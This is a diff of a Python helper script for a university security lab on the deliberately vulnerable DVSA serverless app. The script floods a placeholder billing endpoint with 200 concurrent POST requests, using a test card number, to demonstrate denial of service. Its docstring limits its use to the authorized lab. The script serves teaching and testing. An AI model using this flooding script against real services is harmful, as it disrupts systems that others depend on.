@@ -1,16 +1,33 @@
+import os
 import threading
 import requests
 
-url = "https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order"
+"""
+ICS344 DVSA Security Project
+Lesson 6 - Denial of Service (DoS)
+
+This helper script sends concurrent billing requests to demonstrate how the
+DVSA billing endpoint behaves under high request volume.
+
+IMPORTANT:
+- Use only in the authorized DVSA lab environment.
+- Do not commit real authorization tokens to GitHub.
+- Set DVSA_API_URL, DVSA_TOKEN, and DVSA_ORDER_ID before running.
+"""
+
+API_URL = os.getenv("DVSA_API_URL", "https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order")
+AUTH_TOKEN = os.getenv("DVSA_TOKEN", "<TOKEN>")
+ORDER_ID = os.getenv("DVSA_ORDER_ID", "<ORDER_ID>")
+THREAD_COUNT = int(os.getenv("DVSA_THREAD_COUNT", "200"))
 
 headers = {
-    "Authorization": "<TOKEN>",
+    "Authorization": AUTH_TOKEN,
     "Content-Type": "application/json"
 }
 
 payload = {
     "action": "billing",
-    "order-id": "<ORDER_ID>",
+    "order-id": ORDER_ID,
     "data": {
         "ccn": "4242424242424242",
         "exp": "03/28",
@@ -18,19 +35,33 @@ payload = {
     }
 }
 
+
 def send_request(i):
     try:
-        response = requests.post(url, json=payload, headers=headers)
-        print(f"{i}: {response.status_code}")
-    except Exception as e:
-        print(f"{i}: ERROR")
+        response = requests.post(API_URL, json=payload, headers=headers, timeout=20)
+        print(f"Request {i}: {response.status_code} - {response.text[:80]}")
+    except Exception as error:
+        print(f"Request {i}: ERROR - {error}")
 
-threads = []
 
-for i in range(200):
-    t = threading.Thread(target=send_request, args=(i,))
-    threads.append(t)
-    t.start()
+if __name__ == "__main__":
+    print("=" * 70)
+    print("Lesson 6 - DoS Concurrent Billing Request Test")
+    print("=" * 70)
+    print(f"Target API: {API_URL}")
+    print(f"Thread count: {THREAD_COUNT}")
+    print("-" * 70)
 
-for t in threads:
-    t.join()
+    threads = []
+
+    for i in range(THREAD_COUNT):
+        thread = threading.Thread(target=send_request, args=(i,))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+    print("=" * 70)
+    print("Test completed.")
+    print("=" * 70)
